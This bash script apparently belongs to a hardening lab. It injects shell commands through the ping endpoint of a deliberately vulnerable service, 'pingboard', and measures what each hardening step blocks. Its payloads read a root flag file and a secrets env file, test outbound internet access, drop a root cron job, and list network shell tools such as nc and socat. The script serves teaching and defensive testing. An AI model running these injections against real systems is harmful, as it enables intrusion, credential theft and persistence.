#!/usr/bin/env bash
# The attacker's view of pingboard. Run it after EACH hardening step and watch
# the same injection do less and less. Nothing here is exotic: it is curl.
#
#   ./pwn.sh            run every probe against http://127.0.0.1:8080
#   TARGET=host:port ./pwn.sh   point it elsewhere (e.g. from the host client)
#
# Probes:
#   1. identity   -> who does the injected command run as?
#   2. secret     -> can it read the host's root-only flag?
#   3. environ    -> can it read the service's secret env file?
#   4. egress     -> can the box phone home / exfiltrate?
#   5. persist    -> can it drop a root cron job?
#   6. toolbox    -> what post-exploitation tools are lying around?
set -u
TARGET="${TARGET:-127.0.0.1:8080}"
BASE="http://$TARGET"

# URL-encode a shell payload and fire it through the vulnerable ping endpoint.
inject() {
  local payload="$1"
  # encode spaces, ; and a few friends
  local enc
  enc=$(python3 -c 'import sys,urllib.parse as u; print(u.quote(sys.argv[1]))' "127.0.0.1; $payload")
  curl -s --max-time 20 "$BASE/api/ping?host=$enc"
}

hr() { printf '\n\033[1;36m== %s ==\033[0m\n' "$1"; }

hr "0. is it even up?"
curl -s --max-time 5 "$BASE/" || { echo "no answer from $BASE"; exit 1; }

hr "1. identity: id"
inject 'id' | python3 -c 'import sys,json; print(json.load(sys.stdin)["output"])' 2>/dev/null \
  || echo "(could not parse — injection may be blocked)"

hr "2. read host root secret: cat /root/flag.txt"
inject 'cat /root/flag.txt' | python3 -c 'import sys,json; print(json.load(sys.stdin)["output"])' 2>/dev/null \
  || echo "(blocked)"

hr "3. read service secret env: cat /srv/pingboard/secret.env"
inject 'cat /srv/pingboard/secret.env' | python3 -c 'import sys,json; print(json.load(sys.stdin)["output"])' 2>/dev/null \
  || echo "(blocked)"

hr "4. egress: can it reach the internet?"
inject 'if command -v curl >/dev/null; then curl -s --max-time 5 https://example.com/ -o /dev/null && echo EGRESS-OK || echo EGRESS-BLOCKED; else echo EGRESS-UNTESTED-curl-unavailable; fi' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["output"])' 2>/dev/null \
  || echo "(blocked)"

hr "5. persistence: drop a root cron job"
inject 'echo "* * * * * root id > /tmp/pwned" > /etc/cron.d/mshp-pwn && echo WROTE-CRON || echo CRON-DENIED' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["output"])' 2>/dev/null \
  || echo "(blocked)"

hr "6. post-exploitation toolbox on the box"
inject 'for t in nc ncat socat nmap tcpdump gcc python3 perl ruby php node; do command -v $t >/dev/null && echo "present: $t"; done' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["output"])' 2>/dev/null \
  || echo "(blocked)"

echo
echo "done. Re-run after each hardening step and compare."
